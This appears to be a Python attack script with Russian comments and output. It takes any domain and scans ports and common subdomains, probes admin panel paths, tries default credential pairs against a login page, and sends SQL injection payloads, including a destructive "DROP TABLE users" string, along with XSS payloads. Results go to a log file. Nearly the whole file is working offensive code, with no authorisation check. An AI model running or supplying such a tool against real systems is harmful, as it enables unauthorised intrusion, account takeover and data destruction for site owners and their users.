import socket
import requests
from urllib.parse import urljoin
import datetime
import os

# =============================
# Настройки
# =============================
SUBDOMAINS = ["admin", "mail", "ftp", "cpanel", "webmail", "test", "dev"]
PORTS = [21, 22, 80, 443, 8080, 8443]
ADMIN_PATHS = ["admin", "admin/login", "cpanel", "dashboard", "panel", "admin.php", "login.php", "wp-login.php"]
INJECTION_PAYLOADS = ["' OR '1'='1", "\" OR \"1\"=\"1", "<script>alert(1)</script>", "'; DROP TABLE users;--"]
CREDENTIALS = [("admin", "admin"), ("root", "toor"), ("admin", "1234")]
LOG_DIR = "logs"

# =============================
# Ввод
# =============================
domain = input("Введите домен (например, example.com): ").strip()
now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
log_file = os.path.join(LOG_DIR, f"{domain}_{now}.txt")
os.makedirs(LOG_DIR, exist_ok=True)

def log(msg):
    print(msg)
    with open(log_file, "a") as f:
        f.write(msg + "\n")

log(f"\n[+] Подключение к: {domain}")
try:
    ip = socket.gethostbyname(domain)
    log(f"[+] IP адрес: {ip}")
except:
    log("[!] Не удалось получить IP")
    exit()

# =============================
# Скан портов
# =============================
log("\n[+] Скан портов:")
for port in PORTS:
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((ip, port))
        log(f" [+] Открыт порт: {port}")
        s.close()
    except:
        pass

# =============================
# Поддомены
# =============================
log("\n[+] Поддомены:")
for sub in SUBDOMAINS:
    try:
        subdomain = f"{sub}.{domain}"
        socket.gethostbyname(subdomain)
        log(f" [+] Найден: {subdomain}")
    except:
        pass

# =============================
# Поиск admin панелей
# =============================
log("\n[+] Admin панели:")
for path in ADMIN_PATHS:
    url = f"http://{domain}/{path}"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code in [200, 403]:
            log(f" [+] Найден путь: /{path} [{r.status_code}]")
    except:
        pass

# =============================
# Попытка логина
# =============================
log("\n[+] Попытка входа в admin:")
login_url = f"http://{domain}/login"
for u, p in CREDENTIALS:
    try:
        r = requests.post(login_url, data={"username": u, "password": p}, timeout=3)
        if "logout" in r.text or r.status_code in [200, 302]:
            log(f" [+] Успешный вход: {u}:{p}")
            break
    except:
        continue

# =============================
# SQL инъекция
# =============================
log("\n[+] Тест SQL-инъекций:")
for payload in INJECTION_PAYLOADS:
    try:
        test_url = f"http://{domain}/search?q={payload}"
        r = requests.get(test_url, timeout=3)
        if "error" in r.text.lower() or "sql" in r.text.lower():
            log(f" [!] Возможна SQL-инъекция: {test_url}")
    except:
        pass

# =============================
# XSS инъекция
# =============================
log("\n[+] Тест XSS-инъекций:")
xss_payload = "<script>alert('XSS')</script>"
xss_url = f"http://{domain}/search?q={xss_payload}"
try:
    r = requests.get(xss_url, timeout=3)
    if xss_payload in r.text:
        log(f" [!] Уязвимость XSS: {xss_url}")
except:
    pass

log("\n[✔] Сканирование завершено.")
